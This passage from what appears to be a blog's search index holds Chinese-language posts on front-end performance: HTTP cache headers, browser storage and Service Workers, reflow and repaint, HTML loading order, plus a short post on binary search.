允许就是Public，表示缓存能被很多人访问，我们就去设s-maxage。 通过这个过期时间，判断缓存是否生效。 区别强缓存和协商缓存最大也是最根本的区别是：强缓存命中的话不会发请求到服务器（比如chrome中的200 from memory cache），协商缓存一定会发请求到服务器，通过资源的请求首部字段验证资源是否命中协商缓存，如果协商缓存命中，服务器会将这个请求返回，但是不会返回这个资源的实体，而是通知客户端可以从缓存中加载这个资源（304 not modified）。]]></content>
      <categories>
        <category>web前端性能优化</category>
      </categories>
      <tags>
        <tag>web前端</tag>
        <tag>web前端性能优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web前端性能优化（五）- 基于Http的缓存策略]]></title>
    <url>%2F2018%2F02%2F15%2Fweb%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%EF%BC%88%E4%BA%94%EF%BC%89-%20%E5%9F%BA%E4%BA%8EHttp%E7%9A%84%E7%BC%93%E5%AD%98%E7%AD%96%E7%95%A5%2F</url>
    <content type="text"><![CDATA[基于Http的缓存策略在大规模系统中，我们希望有一个自动的缓存策略，而不是手动的通过localstorage去缓存。通过服务端和浏览器端基于http请求头的协商的方式，形成一个通用的缓存文件的策略。 httpheader Cache-Control：Cache-Control可以出现在Response的Header中，也可以出现在Request的Header中。 Cache-Control具有以下属性： max-age：指定缓存的最大有效时间。max-age可以让浏览器在规定的时间段内，不向服务端发起一个请求。因为max-age表示，服务端告诉浏览器，在这段时间内，这个资源都是有效的，都是不会过期的。这个属性比expires的优先级要高。 s-maxage、public、private: 也是指定缓存的有效时间，但仅仅是指定public的缓存。缓存设备有很多，例如：CDN作为一种缓存设备。缓存设备有两种情况：1.是private的缓存设备。例如：客户端浏览器缓存的信息，只有客户端浏览器才能使用，这种缓存便是private。2.另一种是public的缓存设备，能被很多用户去访问，读取信息。总结一下，s-maxage的优先级是高于max-age的，同时它也只对public缓存设备生效。实例来说，一个资源被设置了s-maxage，那么它会去public的缓存设备（CDN）去读有效信息。也就是说，规定了s-maxage的资源，它不是去浏览器去拿数据，而是去cdn去拿数据，cdn是我们的public缓存设备。这个请求发往我们的cdn，cdn下发一个缓存状态和缓存信息。对于公共的cdn设备来说，在s-maxage这一段时间内，这个缓存资源是不会过期的。等超过了s-maxage，我们的cdn才会去源服务器去更新它存的资源，是一个回源的动作。 no-cache：no-cache一般与max-age搭配使用，no-cache表示，会询问浏览器是否有该资源的缓存策略，文件是否过期。而不是像max-age直接将该资源从浏览器的缓存读出。它会发送请求到服务端，服务端发送类似于last-modify的信息，去进一步判断当前浏览器端缓存是否过期。所以，no-cache能让所有请求都到服务端。 no-store：不存，完全不使用缓存。 Expires 缓存过期时间，用来指定资源到期的时间，是服务端的具体的时间点。 告诉浏览器在过期时间前浏览器可以直接从浏览器缓存取数据，而无需再次请求。 max-age和expires之间的关系：max-age的优先级高于expires。expires出自于http1.0，max-age出自于http1.1。在http1.1版本中，我们希望hash的管理是通过一个统一的header去管理，所以增加了cache-control去控制max-age。当存在max-age时，expires实际上时被忽略的。 max-age和Expires 是一个强浏览器缓存策略，当Response Header设置了max-age和Expires后。当http请求中的这两个请求头生效时，浏览器不会向服务器去发起任何请求，而是直接从浏览器缓存中读取相应的数据。 因此，当我的服务端的资源更新时，设置了这两个请求头的前提下，我们的客户端浏览器是无法感知到的。 last-modified/if-modified-since 是基于客户端和服务端协商的缓存机制。 当浏览器向服务端发送http请求。 服务端在返回的response中，种下last-modified的响应头字段。 浏览器拿到这个字段以后，会将其存储。也就是说，浏览器拿到了服务端资源的最新的更新时间。 浏览器存储当前已知的资源最新更新时间是使用字段if-modified-since。 当浏览器再针对这个url发送请求时，会带上这个if-modified-since。 服务端接收到这个header。此时客户端告诉服务端我拿到的是你某个时间点的资源版本，服务端验证资源是否已经更新过了。如果没有更新，返回一个304的状态以及last-modified，告诉客户端，资源没有更新，你可以使用这个资源在客户端的缓存。浏览器根据这个304的状态去客户端的缓存中，读取这个文件使用。 如果服务端发现客户端发送的是老版本时间，就返回一个200的状态以及最新的last-modified，告诉客户端，不能使用缓存，使用我最新发给你的资源。 last-modified/if-modified-since 实质是服务端和客户端的缓存协商机制。 last-modified/if-modified-since 要和cache-control联合使用。因为cache-control存在max-age的情况，且max-age还没有过期，浏览器以max-age为准，直接从浏览器缓存中读取资源。max-age过期以后，浏览器才会使用这种协商机制。 last-modified/if-modified-since 和 max-age都是服务端控制的缓存策略。 last-modified/if-modified-since存在的问题：1.某些服务端不能获取精确的修改时间。2.文件修改时间改了，但文件内容没有变。这种情况下的缓存失效，是资源浪费。 Etag/If-None-Match Etag是文件内容的hash值，也需要与cache-control共同使用。 Etag是服务端通过response header下发的响应头。 if-None-Match会将下发的Etag的hash值通过request 带到服务端去。 这个协商机制比 last-modified/if-modified-since 的时间机制更加精确，是基于文件内容的。当文件内容改变时，会直接反映在Etag上。 etag 的优先级比 last-modified 的优先级更高。 分级缓存策略 针对大量的静态资源，服务端基于http header配置缓存策略。 缓存流程弱缓存流程图 用户发出请求去请求资源。 浏览器根据url判断资源是否存在缓存。 没有缓存。会去向服务器发出请求，服务端响应请求，并下发缓存的协商策略。最终浏览器拿到这个协商策略，展示我们的页面。 存在缓存，就去解析缓存文件。 浏览器先通过expires和max-age去检查缓存是否已经过期。缓存没有过期，就会直接使用缓存的内容，展示我们的页面。 缓存过期，浏览器取找ETag属性。v 有ETag，会向服务器请求带上if-none-match字段。服务器根据if-none-match，判断浏览器上的文件和我们最新的文件的hash值是否相同。相同，返回304，浏览器读取本地缓存，展示页面。返回200，表示服务器文件更新了，我们的浏览器会拿到新的文件，新的ETag. 没有Etag,就走last-modified逻辑。 强缓存流程图 cache-control决定我们的浏览器是否使用缓存存储。 不使用缓存存储，那么cache-control对应的就是no-store。 如果使用缓存存储，就判断每次请求是否重新验证。 需要重新验证，那就不会从强缓存去读缓存的文件，而是通过http的header去和服务端进行一个协商。 就是说，no-cache，我的每个请求都会发到服务端，由服务端决定缓存是否生效。 不需要重新验证，那我们就需要使用我们的max-age,s-maxage。 看是否允许被代理服务缓存。 不允许就是Private，也就是浏览器层面的缓存，我们就去设max-age。 允许就是Public，表示缓存能被很多人访问，我们就去设s-maxage。 通过这个过期时间，判断缓存是否生效。 区别强缓存和协商缓存最大也是最根本的区别是：强缓存命中的话不会发请求到服务器（比如chrome中的200 from memory cache），协商缓存一定会发请求到服务器，通过资源的请求首部字段验证资源是否命中协商缓存，如果协商缓存命中，服务器会将这个请求返回，但是不会返回这个资源的实体，而是通知客户端可以从缓存中加载这个资源（304 not modified）。]]></content>
      <categories>
        <category>web前端性能优化</category>
      </categories>
      <tags>
        <tag>web前端</tag>
        <tag>web前端性能优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web前端性能优化（四）- 浏览器的存储能力分析及PWA]]></title>
    <url>%2F2018%2F02%2F10%2Fweb%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%EF%BC%88%E5%9B%9B%EF%BC%89-%20%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%AD%98%E5%82%A8%E8%83%BD%E5%8A%9B%E5%88%86%E6%9E%90%E5%8F%8APWA%2F</url>
    <content type="text"><![CDATA[cookie 因为Http请求是无状态请求，所以需要使用cookie去维护客户端的状态。 无状态：当我的浏览器发出一个http请求后，服务器接收到这个请求，接着这个http请求就关闭了。后续的所有的http请求，浏览器并不知道它们之间是否来自于同一个客户端。 因此，我们很难解决登录信息维护的问题。 如何使用cookie去维护我们的登录信息 服务端返回请求头：set-cookie 浏览器收到服务端返回的response中的header，就会把响应的cookie信息种到客户端中。 即，我们客户端种的客户信息是服务端命令客户端种下的。 客户端之后的请求，都会携带这么一个cookie标识。 如此这般，服务器就能知道这个http请求是来自于哪个客户了。 客户端读写cookiejs通过document.cookie。 cookie两个层面的使用 用于浏览器端和服务端的交互。 客户端自身数据的存储。 因此，cookie的设计目的是去维护客户端与服务端之间的状态。 cookie存储限制 因为cookie的设计目的仅仅是维持一个客户端与服务端的交互。所以大小小，仅有4kb左右。 cookie需要设置过期时间expire。 因此，cookie的存储数据能力被localsorage替代。 cookie的httpOnly当前这么一个cookie是不支持浏览器读写的，即js代码无法读取当着这个域下的这个cookie。 cookie的损耗 cookie中在相关域名下面，会带来cdn的流量损耗。cookie是域名维度下的概念，该域名下的所有请求都会携带cookie。因此，一些css或者js静态文件请求也会携带cookie，这些cookie信息是无用的，这会带来巨大的，无用的损耗。 因此，cdn的域名和主站的域名分开。注意，不是1级2级这种分开，是独立的两个域名。大公司如果不这么做，cookie带来的流量损耗可能是巨大的。 总结 因为http请求无状态，所以需要cookie去维持客户端状态。 过期时间expire。 cookie的生成方式。 http response header中的set-cookie。 js中可以通过document.cookie可以读写cookie。 仅仅作为浏览器存储（大小4kb左右，能力被localstorage替代）。 cookie中在相关域名下面——cdn的流量损耗 HttpOnly。 LocalStorage 相比于cookie又当爹又当妈，既被用作浏览器存储，又被用作维护客户端与服务端状态交互。localstorage是设计出来专门用于浏览器存储的。 大小为5M。 仅在客户端使用，不和服务端进行通信。 接口封装较好。 浏览器本地缓存方案。 缓存方案 第一次进入某网页，将网页内不变的商品信息存在localstorage中。后续再次访问时，直接从localstorage去读取数据，降低首屏渲染时间。 SessionStorage 会话级别的浏览器存储。浏览器的一个标签就有一个SessionStorage，当这么一个标签页关闭后，SessionStorage存的信息就清空了。 大小为5M左右。 仅在客户端使用，不和服务端进行通信。 接口封装较好。 对于表单信息的维护。1.用户注册页面，如果用户不小心刷新，表单信息就会丢失。用seesionstorage实时存这些信息，用户在这个标签内刷新，是不会丢失信息的。但用户如果关闭标签，重新打开标签，就需要重新填写了。2.表达经常点击下一步，下一步。这可能会涉及到单标签的多个页面。我们可以利用SessionStorage进行数据的共享。 IndexedDB IndexedDB是一种低级API，用于客户端存储大量结构化数据。该API使用索引来实现对该数据的高性能搜索。虽然WebStorage对于存储较少量的数据很有用，但对于存储更大量的结构化数据来说，这种方法不太有用。IndexedDB提供了一个解决方案。 为应用创建离线版本。 Service Workers JS是单线程的，因此，所有的JS代码都是在JS的主线程执行的。当执行大规模数据运算时，JS的执行就会阻塞UI线程的渲染。 使用Service Workers在后台进行大规模数据运算，将数据处理结构给主线程，避免主线程阻塞，大大提升了浏览器处理大规模数据运算的能力。 PWA Progressive Web Apps 是一种Web App新模型，并不是具体指某一种前沿的技术或者某一个单一的知识点，我们从英文缩写来看就能看出来，这是一个渐进式的Web App，是通过一系列新的Web特性，配合优秀的UI交互设计，逐步的增强Web App的用户体验。 1.弱网环境app能否加载。2.离线能否加载成功。即在不同环境下，你的web App能否有一个渐进式的体验。 PWA的3个基本要求 可靠：在没有网络的环境中也能提供基本的页面访问，而不会出现“未连接到互联网”的页面。 快速：针对网页渲染及网络数据访问有较好优化。我们希望Web App能达到native的效果。 融入：应用可以被增加到手机桌面，并且和普通应用一样有全屏、推送等特性。 再谈Service Worker Service Worker是一个脚本，浏览器将其独立于当前页面，并在后台运行，这为实现不依赖页面或者用户交互的特性打开了一扇大门。在未来这些特性将包括推送消息，背景后台同步，geofencing(地理围栏定位)，但它退出的第一个首要特性，就是拦截和处理网络请求的能力，包括以编程方式来管理被缓存的响应。 应用1：使用拦截和处理网络请求的能力，去实现一个离线应用。当我的请求发出时，被Service Worker拦截，Service Worker利用浏览器缓存先去渲染一部分数据，后续再请求到资源，再去替换。这样当无网络的情况下，我们的Web App 仍然能够渲染出来。 应用2：使用Service Worker在后台运行同时能和页面通信的能力，去实现大规模后台数据处理。当我们有大规模的数据需要去处理，且处理这个数据不依赖于页面，也不依赖于用户交互，那么就可以把数据放到Service Worker中去处理。这样，大规模的数据处理就不会阻塞UI的渲染。得到结果以后，通过与主页面通信的机制，将运算结果传给主页面，主页面从而进行后面的逻辑。 Service Worker生命周期 Service Worker在安装成功激活后，我们就可以使用它的API了，它是一个事件驱动的。 利用Service Worker截获请求的能力，将大量的图片和JS存放在浏览器为Service Worker准备的cache中。这样，下次请求，浏览器会直接使用Service Worker的缓存数据。 ServiceWorker 离线化伪代码 ServiceWorker只能在https才能起作用，本地要使用localhost 1navigator.serviceWorker.register 调用navigator.serviceWorker注册serviceWorker。返回一个Promise。 123456789101112131415161718192021222324252627282930- 监听Service Worker安装，为Service Worker添加缓存// 添加缓存self.addEventListener(&apos;install&apos;, (e) =&gt; &#123; e.waitUtil( // 在service worker的生命周期中添加缓存 caches.open(&apos;demo&apos;) .then((cache) =&gt; &#123; // 这里可以向cache中添加缓存的静态资源文件。这些文件在主页面的主流程中已经加载完成了。这里，我们只是将它扔在cacheStorage中。 &#125;) )&#125;)- 监听浏览器请求，sService Worker拦截请求// 拦截请求，使用缓存伪造响应self.addEventListener(&apos;fetch&apos;, (e) =&gt; &#123; // 改变fetch事件返回的数据 e.respondWith( // 去缓存中match请求的静态资源 caches.match(event.request) .then((res) =&gt; &#123; // 命中了缓存 if (res) &#123; return res &#125; else &#123; // 没有命中缓存，说明cache中没有相关资源，使用fetch网络请求相关资源 // 请求到后，再添加到我们的cache中 &#125; &#125;) )&#125;) ServiceWorker 主页面之间通信伪代码 调用navigator.serviceWorker注册serviceWorker。返回一个Promise。 主页面发送信息给ServiceWorker，ServiceWorker监听到这个message以后，会广播到所有ServiceWorker管理的页面当中。 所有的tap监听ServiceWorker发送的事件，当监听到事件时，会收到这个message。1234567891011121314151617181920// 发送messagenavigator.serviceWorker.controller.postMessage(message)// 监听ServiceWorker的广播事件,将所有message广播给管理的tagself.addEventListener(&apos;message&apos;, function (event) &#123; self.clients.matchAll().then(function (clientList) &#123; var senderId = event.source ? event.source.id : &apos;unkown&apos; clientList.forEach(function (client) &#123; if (client.id === senderId) &#123; return &#125; else &#123; // 不是源client，向这个client发送相关信息 client.postMessage(&#123; client.senderId, message: event.data &#125;) &#125; &#125;) &#125;)&#125;)]]></content>
      <categories>
        <category>web前端性能优化</category>
      </categories>
      <tags>
        <tag>web前端</tag>
        <tag>web前端性能优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[经典数据结构--二分搜索]]></title>
    <url>%2F2018%2F02%2F09%2F%E7%BB%8F%E5%85%B8%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E4%BA%8C%E5%88%86%E6%90%9C%E7%B4%A2%2F</url>
    <content type="text"><![CDATA[一般意义的二分对于一个有序数组，每次二分寻找。所以时间复杂度为O(logN)。 找到首次出的k 对于一个有序数组，二分之后查找左部。 未找到，对于左边部分再去二分。 求局部最小值 首部：如果0位置的数比1位置的数小，0位置的数叫做局部最小值。 尾部：如果N-2位置的数比N-1位置的数小，N-2位置的数叫做局部最小值。 中间：对于中间某位置，设为mid位置的数，一定要比mid-1位置，及比mid+1位置的数小，才是局部最小值。 求数组中的一个局部最小值，且数组相邻数不相等。 局部最小值二分解法（不一定有序才能二分） 如果0位置比1位置大，N-1位置比N-2位置大，即首尾均呈下降趋势。那么数组的中间部分一定会出现局部最小。即从2位置起，后面某个位置的数稍微上扬，就一定会有局部最小。 此时，二分。取一个mid，观察mid是不是局部最小。 mid比其左边的数大，即首部和mid之间一定存在局部最小。那么mid右边可以不考虑。 如此这般二分，一定能找到局部最小。]]></content>
      <categories>
        <category>经典数据结构</category>
      </categories>
      <tags>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web前端性能优化（三）- CSS、JS与回流重绘]]></title>
    <url>%2F2018%2F02%2F08%2Fweb%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89-%20%20CSS%E3%80%81JS%E4%B8%8E%E5%9B%9E%E6%B5%81%E9%87%8D%E7%BB%98%2F</url>
    <content type="text"><![CDATA[css性能让javascript变慢？ css的加载与解析是阻塞页面渲染的，js的加载与解析也是阻塞页面渲染的。 有时，js死循环，页面卡死了。 一个线程负责Javascript解析，一个线程负责UI渲染，那么为何javascript会阻塞页面的渲染。原因：javascript是可能在代码中去获取当前的dom的，即渲染的结果。所以，渲染前与渲染后，javascript获取的渲染的dom结果是不一样的。因此，如果UI的渲染和javascript的解析执行是并行的话，那么我们javascript代码执行的去获取的css属性布局及dom，可能就与我们期望的结果不同。所以，合理的解决办法是，UI的渲染线程和javascript的解析线程是互斥的。当UI线程渲染时，js代码不解析执行。反之，js代码解析执行，UI线程渲染冻结。 所以，css会影响页面的样式展示，即影响UI线程的渲染。如果css频繁触发重汇与回流的机制，会导致UI线程频繁的渲染，由于阻塞js的线程解析执行，最终导致js变慢。 因此， css性能会让javascript变慢。 所以，我们需要优化css的写法和性能，从而让UI线程渲染的次数和渲染的难度降低，从而加快渲染速度，从而加快js解析执行，使得整个性能得到提升。 回流 当render tree中的一部分（或全部）因为元素的规模尺寸、布局隐藏等改变需要重新构建。这就称为回流。 即：当页面布局和几何属性改变时就需要回流。例如：图片的缩小放大。 重绘 当render tree中的一些元素需要更新属性，而这些属性只是影响元素的外观，风格，而不影响布局的，比如background-color。则叫重绘。 重绘不一定触发回流，但是回流一定会引起重绘。 关注浏览器团队的开发的新特性，对于我们对前端的性能优化是大有裨益的。 触发页面布局的属性，触发回流 盒子模型相关属性会触发重布局width、height、padding、margin、display、border-width、border、min-height。 定位属性及浮动也会触发重布局top、bottom、left、right、position、float、clear。 改变节点内部文字结构也会触发重布局text-align、overflow-y、font-weight、overflow、font-family、line-height、vertical-align、white-space、font-size。 触发重绘的属性color、border-style、border-radius、visibility、text-decoration、background、background-image、background-position、background-repeat、background-size、outline、outline-style、outline-width、box-shadow。 性能优化出发点一：避免回流 我们知道上述属性会触发回流，我们能不能使用别的方案去替代这些属性，从而避免触发回流？ 性能优化出发点二：图层维度 新建dom过程1.获取dom分割为多个图层。例如:具有translateZ这样属性的dom会被单独放在一个图层中。2.对每个图层的节点计算样式结果（Recalculate style – 样式重计算）。3.为每个节点生成图形和位置（Layout – 回流和重布局）。4.将每个节点绘制填充到图层位图中（Paint Setup 和 Paint –重绘）。5.图层作为纹理上传至GPU。6.复合多个图层到页面上生成最终屏幕图像（Composite Layers – 图层重组）。 即我们的重绘回流是以图层为单位的。 因此，将频繁重绘回流的dom元素单独作为一个独立图层，那么这个DOM元素的重绘和回流的影响只会在这个图层。减少了运算量。 但是，如果图层过多，图层的合成过程是会消耗大量的运算量的，所以仅仅我们需要使用抽出一个新图层时，再去使用。在chrome可以使用performance工具，观察我们新抽了一个图层会不会提高性能。 如何将dom元素变成新的图层？ 3D或透视变换CSS属性（perspective transform） 使用加速视频解码的video节点。video会播放，播放是Chrome对于传过来的画面的每一帧进行画面的重绘，才能看到一个连续播放场景。所以对于这种天生就需要频繁回流重绘的节点，chrome便会为他抽出一个新的图层。 拥有3D(WebGL)上下文或加速的2D上下文的canvas节点。 混合插件(flash) 对自己的opacity做css动画或使用一个动画webkit变换的元素。 拥有加速css过滤器的元素。例如：translate3d这类需要gpu加速的属性，chrome认为这个图层需要经常回流重绘，所以会单独抽出一个图层。 元素有一个包含复合层的后代节点（一个元素拥有一个子元素，该子元素在自己的层里） 元素有一个z-index较低且包含一个复合层的兄弟元素，即就是该元素在复合层上渲染。即z-index使得元素有一个上下层次关系。 总结：1.避免使用触发重绘、回流的css属性。2.将重绘、回流的影响范围限制在单独的图层之内。 例子 gif中的回流与重绘gif是在img，所以不会单独作为一个图层，所以我们需要抽出它。 轮播中的回流与重绘left改变 -&gt; layout (回流) -&gt; update layer tree -&gt; paint (重绘) -&gt; composite layers （图层重组） 利用css属性新建图层 transform: translateZ(0) will-change: transform 实战优化点 用translate替代top：top会触发Layout(回流和重布局)，进而导致回流。而translate不会(相比改变top值，改变translate属性会少一个layout的过程)。例如：浮窗一般用setTimeout控制浮动周期，用top等值会频繁触发layout，而translate则不会。 用opacity替代visibility。visibility会触发重绘而opacity不会触发重绘（opacity的改变不会触发paint）。但是，值得注意的是：重绘是重绘绘制当前图层的内容。opacity改变，浏览器会改变整个图层的透明度，即这是以图层为单位来修改透明度的，所以，改变opacity可能会触发layout和paint。要想像我们要求的效果，不触发layout和paint，要将修改opacity改变的元素，独立出一个图层来。 不要一条一条地修改dom样式，预先定义好class，然后修改dom的className。因为，我们每修改一条dom样式，都会触发重绘，我们应当通过className一次性修改dom样式。 把DOM离线后修改。比如：先把DOM给display:none(有一次reflow)，然后你修改100次，再将它显示出来。 不要把DOM结点的属性值放在一个循环里当成循环里的变量。例如：当我们使用offsetHeight与offetWidth读取某个dom元素的位置信息时，浏览器会强行刷新回流重绘的缓冲区。这样，缓冲区的机制就被破坏了。这是dom属性与缓冲区之间的关系。 不要使用table布局，可能很小的一个小改动会造成整个table的重新布局。当我们table特别大时，一个小改动会造成很大的layout(回流和重布局)性能损耗。而使用Div，div仅仅会影响后面元素的layout，不会影响前面不相干的元素。 动画实现速度的选择。因为UI的渲染线程和JS的执行线程是相互阻塞的，因为动画会触发回流，回流频率过高，一直在重新渲染，使得JS的执行被阻塞了，就会造成页面卡顿。这种情况需要具体分析，例如10ms改变一下元素位置创建动画一定比100ms改一次更平滑，但是100ms的layout和paint的次数多，影响性能。 对于动画新建图层。当我们使用canvas或者video标签时，chrome知道这里会频繁的layout。所以，chrome会自发的为其新建图层。对于我们自己写的动画，chrome并不了解这个事情，需要我们手动将动画建立图层，这样保证我们的回流和重绘影响面小一点。 启用GPU加速，GPU的计算能力强，是一个并行运算的运算单元。缺点：1.开启GPU加速很简单，使用translate3d或其它属性即可。但是，这种加速也是有相应的缺点的：1.GPU加速可能会导致图层过多，从而导致图层合成（Composite Layers）也会造成大量的性能消耗。2.因为数据要通过CPU走总线到GPU上，GPU才能运算。当数据量大，传输损耗也是巨大的。 量化分析 性能优化是必须针对场景case的。性能优化前后的指标是可以通过chrome的performance工具量化分析的。实践出真知。]]></content>
      <categories>
        <category>web前端性能优化</category>
      </categories>
      <tags>
        <tag>web前端</tag>
        <tag>web前端性能优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web前端性能优化（二）- 从html的加载与解析说起]]></title>
    <url>%2F2018%2F02%2F07%2Fweb%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%EF%BC%88%E4%BA%8C%EF%BC%89-%20%E4%BB%8Ehtml%E7%9A%84%E5%8A%A0%E8%BD%BD%E4%B8%8E%E8%A7%A3%E6%9E%90%E8%AF%B4%E8%B5%B7%2F</url>
    <content type="text"><![CDATA[一个网站在浏览器端是如何渲染的 首先请求回来的html文件，从一个字节流转换为字符流。浏览器拿到字符流，通过词法分析，形成一个dom树。因此html文档解析有一个特点，是从上到下进行的一个词法分析，逐条解析，逐条append上我们的dom树上。 在逐条分析html文档的过程中，碰到link,src等标签，浏览器会去其它的服务器并发的请求其它的资源。 并发的请求到css时，会生成cssom树。 将dom树和cssom树合并成一个渲染树（renderTree） 总结：浏览器拿到html文档，文档被浏览器html parser解析器解析，通过词法分析的过程，将不同的tag形成不同的token，依次从上到下解析token，一步一步append我们的dom树。在这个过程中，解析了link,script这样的标签，并发的请求我们的外部资源，进一步解析我们的外部资源。请求回来css树后，css树和dom树合并形成渲染树render tree，紧接着布局 layout，再paint到我们的浏览器上。 在这个过程总，会出现一些可以优化的性能点。 HTML渲染过程中的一些特点 顺序执行、并发加载（逐条分析tag，在这个过程中并发加载外部资源）。优化点：这里浏览器对单个域名，并发加载的外部资源是有限的。因此我们通常设3到4个cdn域名。 是否阻塞。css加载是否阻塞js加载，是否阻塞js执行，是否阻塞页面的渲染。js加载是否阻塞后续js的加载和执行。 依赖关系。html渲染过程中是否存在一定的依赖关系？例如：1.页面html渲染出来，但是css样式没出来，突然一闪，css样式出来了。这说明没有遵循好依赖关系，将css放入head中去引入，整个页面的渲染就会等待head中的css加载，形成render tree后，才paint出来。2.通过async 标签，是的js的加载不阻塞页面的渲染，但放弃了js的依赖关系。 引入方式. css的link和import区别。js的script引入。js是否动态引入（对于spa，十分重要，路由到哪个组件，加载哪个组件）。 顺序执行、并发加载 词法分析顺序是从上到下的，也就是说 Dom树的生产也是从上到下的。 并发加载，html中引入的外部资源是并发请求的。 并发上限，某个域名下并发请求的资源是由上限的。 css阻塞 css head中阻塞页面的渲染。浏览器要等待head中css加载完成，生成cssom树，与html的dom树合并为render tree。在这之前，页面是不会渲染的。 css阻塞js的执行。head中css的加载会阻塞js的执行。 css并不会阻塞外部脚本的加载。webkit会预先扫描后面的tag，会通过预资源加载器加载后面的资源。 js会操作dom，js如果依赖于css属性，在css加载完成之前执行js，会可能出现问题。 js阻塞 直接通过Script的Src方式引入的js会阻塞页面的渲染。因为有时js会修改dom结构，所以一定会影响后面的文档生成。所以我们的浏览器一定会等待js的执行完成之后呢，才会再一进步的去分析渲染页面结构。 js不阻塞资源的加载。webkit会进行预加载，并发请求后续的资源。 js顺序执行，阻塞后续js逻辑的执行。例如：顺序的引入10个script脚本，会顺序执行。 依赖关系、js引入的方式 页面渲染依赖于css的加载 js的执行顺序是有依赖关系的。 js逻辑对于dom节点也是有依赖关系的。 js引入方式 直接引入。阻塞页面解析渲染，脚本加载完成后立即执行 defer。不阻塞后续页面解析渲染。脚本顺序执行，且执行要在所有元素解析完成之后，DOMContentLoaded 事件触发之前完成。 async。不阻塞后续页面解析渲染。脚本谁先加载完成，谁执行，且加载完成后立即执行。 异步动态引入js。路由路到哪个组件就渲染哪个组件。 直接引入、defer、async的一些区别 加载和执行的一些优化点 css样式表置顶：放在Head中，会阻塞页面的渲染，保证页面在没有样式的过程中，也能够渲染出来。 link代替import：1.import不触发浏览器并发加载机制。2.import的css样式会在页面渲染完成后才会生效。 js脚本置底部。js放在顶部：1.阻塞渲染。2.由于浏览器对同域名下并发加载有限制，所以js放在顶部可能会减慢其它外部资源的加载。 合理使用js的异步加载能力。 懒加载 概念： 图片进入可视区域之后请求图片资源。 对于电商等图片很多，页面很长的业务场景适用。 减少无效资源的加载（用户看不到的图片没必要立刻加载）。 浏览器的通域名并发限制，并发加载的资源过多会阻塞js的加载，影响网站的正常使用。 做法：当图片进入可视区域后，img的src才会被设置（一般图片的真实地址存在img的data-img上面，当图片进入可视区域，这个地址被放在src上），图片才开始加载。这种请求是延后的。 预加载 概念： 图片等静态资源在使用之前就提前请求。 资源在使用到的时候，能从缓存中加载，提升用户体验。 页面展示的依赖关系维护。 场景： 当需要迅速切换两张图片时，需要将两张图片预加载下来。不然，当你需要a -&gt; b -&gt; a，b还在加载的时候就又切到a了，b的展示就会出问题。 或者某个动画依赖许多图片，如果这些图片没有预加载，在动画进行的过程中再去加载，可能当需要图片时，图片还在加载，图片的展示也会出问题。]]></content>
      <categories>
        <category>web前端性能优化</category>
      </categories>
      <tags>
        <tag>web前端</tag>
        <tag>web前端性能优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web前端性能优化（一）--从思考web前端意义引出前端性能优化]]></title>
    <url>%2F2018%2F02%2F04%2Fweb%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89-%E4%BB%8E%E6%80%9D%E8%80%83web%E5%89%8D%E7%AB%AF%E6%84%8F%E4%B9%89%E5%BC%95%E5%87%BA%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%2F</url>
    <content type="text"><![CDATA[从思考web前端意义引出前端性能优化什么是web前端 web前端本质上是一种GUI软件，本可以直接借鉴其他GUI系统架构设计方法，但web前端有点特别。 cs架构GUI软件的开发与部署：以安卓为例，开发 -&gt; 发布apk -&gt; 用户下载安装运行。即用户访问的是手机本地的资源。 bs架构。开发 -&gt; 发布在CDN，webserver -&gt; 用户打开浏览器，浏览器动态的，增量式的加载资源。 因此，web前端是一个动态的，增量式的加载过程。浏览器 -&gt; http -&gt; server -&gt;http -&gt; 浏览器。如果我们的服务器响应快，浏览器拿到资源快，我们的web前端的体验就好。 产生了核心问题：浏览器的一个请求从发送到返回都经历了什么？ 用户输入一个url 浏览器对url进行拆分解析，将一个domain发送到DNS服务器上 DNS服务器根据domain查询对应的ip地址，返回给浏览器 浏览器拿到ip地址，就将请求发送到网络中去 经过一系列流程，请求到达我们的服务端。 首先进入服务端的controller层，进行逻辑的处理和请求的分发。 再进入model层，model层读取redis + db，获取到数据。 最终数据通过view层返回给我们的网络。 http的response发送回浏览器。 浏览器进行渲染。 浏览器拿到html和css代码后，生成对应的dom树和css树，将这两者进行一个整合。最终知道如何渲染。 紧接着浏览器执行js脚本，提供交互能力。 了解了一个http请求的前世今生，来挖掘优化点 dns可以优化，浏览器层面可以将dns服务器进行一个缓存，减少dns的查询时间。 网络请求的过程可以优化，使用cdn，解决了网络选择（走最近网络）和缓存问题。cdn是请求静态资源的，实际上静态资源中的cookie是没有用的，所以希望将cookie从我们的request的header中去掉。但在很多时候，cdn的域名和网站的域名相同，因此，我们主站的cookie会被携带到我们cdn的服务端，损耗了网络。所以cdn域名不要和主站域名一样。 cdn可以解决静态资源、网络选择、缓存的问题，但是一些接口是无法缓存的。因此，我们在浏览器端可以制定一定的缓存策略，因此对于一些接口和资源我们可以从浏览器的缓存中读取数据，这样又提高了缓存速度。 http请求的带宽越低，那么响应也就越快。 http请求在传输过程中会损耗，将多次网络请求减少为一次，会有效降低传输过程中的损耗。 spa渲染是浏览器的渲染过程，这对首屏渲染有巨大损耗，这就需要服务端渲染以及渲染优化方案。 总结：1.dns是否可以通过缓存减少dns查询时间。2.网络请求的过程中走最近的网络。3.相同的静态资源是否可以缓存。4.能否减少http请求大小。5.减少http请求。6.服务端渲染。 因此，深入理解http请求的过程是前端性能优化的核心，且也是基于现有业务，包括业务环境和业务使用的技术栈的理解。]]></content>
      <categories>
        <category>web前端性能优化</category>
      </categories>
